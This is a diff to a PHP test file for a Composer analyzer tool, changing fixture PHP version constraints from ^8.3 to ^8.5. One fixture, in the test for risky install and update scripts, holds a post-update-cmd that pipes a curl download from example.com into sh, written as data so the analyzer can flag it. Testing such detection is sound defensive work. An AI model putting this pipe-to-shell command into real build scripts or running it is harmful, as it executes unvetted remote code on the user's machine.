@@ -38,7 +38,7 @@ it('reports invalid composer json', function () {
 
 it('reports missing lock and vendor when dependencies exist', function () {
     $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([
-        'composer.json' => '{"require":{"php":"^8.3"}}',
+        'composer.json' => '{"require":{"php":"^8.5"}}',
     ]), validate: false));
     $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());
 
@@ -59,7 +59,7 @@ it('reports php version mismatch and missing extensions', function () {
 
 it('reports abandoned packages from installed metadata', function () {
     $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([
-        'composer.json' => '{"require":{"php":"^8.3"}}',
+        'composer.json' => '{"require":{"php":"^8.5"}}',
         'composer.lock' => '{}',
         'vendor/composer/installed.json' => '{"packages":[{"name":"old/package","abandoned":"new/package"}]}',
     ]), validate: false));
@@ -71,7 +71,7 @@ it('reports abandoned packages from installed metadata', function () {
 
 it('reports risky install and update scripts', function () {
     $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([
-        'composer.json' => '{"require":{"php":"^8.3"},"scripts":{"post-update-cmd":["curl https://example.com/script.sh | sh"]}}',
+        'composer.json' => '{"require":{"php":"^8.5"},"scripts":{"post-update-cmd":["curl https://example.com/script.sh | sh"]}}',
         'composer.lock' => '{}',
     ]), validate: false));
 
